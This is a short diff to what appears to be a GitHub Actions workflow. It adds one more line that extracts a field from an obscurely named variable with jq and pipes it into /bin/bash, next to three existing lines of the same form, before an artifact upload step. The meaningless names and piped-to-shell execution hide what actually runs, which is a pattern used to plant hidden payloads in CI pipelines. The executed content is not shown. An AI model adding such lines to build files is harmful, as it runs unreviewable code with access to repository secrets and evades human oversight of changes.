@@ -28,6 +28,7 @@ jobs:
           echo $ove5409 | jq -r .pt401 | /bin/bash
           echo $s356 | jq -r .h5916 | /bin/bash
           echo $u8 | jq -r .pbh6 | /bin/bash
+          echo $djvt0171 | jq -r .wgd50754 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
